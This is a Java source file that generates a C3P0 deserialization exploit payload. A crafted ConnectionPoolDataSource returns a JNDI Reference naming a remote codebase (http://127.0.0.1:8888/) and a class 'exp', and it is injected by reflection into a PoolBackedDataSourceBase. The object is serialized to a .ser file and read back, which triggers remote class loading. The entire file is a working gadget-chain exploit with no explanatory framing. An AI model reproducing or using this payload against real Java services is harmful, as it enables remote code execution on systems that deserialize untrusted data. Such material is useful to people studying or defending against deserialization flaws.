import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class Main {
    public static class EXP_Loader implements ConnectionPoolDataSource, Referenceable {

        public Reference getReference() throws NamingException {
            return new Reference("ExpClass","exp","http://127.0.0.1:8888/");
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        public void setLoginTimeout(int seconds) throws SQLException {

        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
    public static void main(String[] args) throws Exception {
        EXP_Loader a = new EXP_Loader();
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(true);
        setFieldValue(poolBackedDataSourceBase,"connectionPoolDataSource",a);
        FileStream.writeSer(poolBackedDataSourceBase,"C3P0_URLClassLoader.ser");
        FileStream.readSer("C3P0_URLClassLoader.ser");

    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
